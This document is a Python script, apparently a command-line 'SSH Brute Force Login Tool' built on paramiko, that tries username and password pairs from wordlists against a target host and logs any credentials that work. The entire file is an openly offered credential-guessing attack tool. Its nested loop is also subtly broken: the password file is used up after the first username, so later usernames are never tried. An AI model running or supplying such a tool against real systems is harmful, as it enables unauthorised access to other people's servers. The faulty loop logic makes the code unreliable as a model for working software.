import paramiko
import argparse
import time

def ssh_connect(host, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(host, port=22, username=username, password=password, timeout=5)
        print(f"[+] Successful login: {username}:{password}")
        with open("ssh_bruteforce.log", "a") as log_file:
            log_file.write(f"Successful login: {username}:{password}\n")
        client.close()
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Failed: {username}:{password}")
        return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="SSH Brute Force Login Tool")
    parser.add_argument("--host", required=True, help="Target IP address")
    parser.add_argument("--userlist", required=True, help="File containing usernames")
    parser.add_argument("--passlist", required=True, help="File containing passwords")
    
    args = parser.parse_args()
    
    with open(args.userlist, "r") as users:
        with open(args.passlist, "r") as passwords:
            for username in users:
                for password in passwords:
                    username = username.strip()
                    password = password.strip()
                    if ssh_connect(args.host, username, password):
                        return

if __name__ == "__main__":
    main()
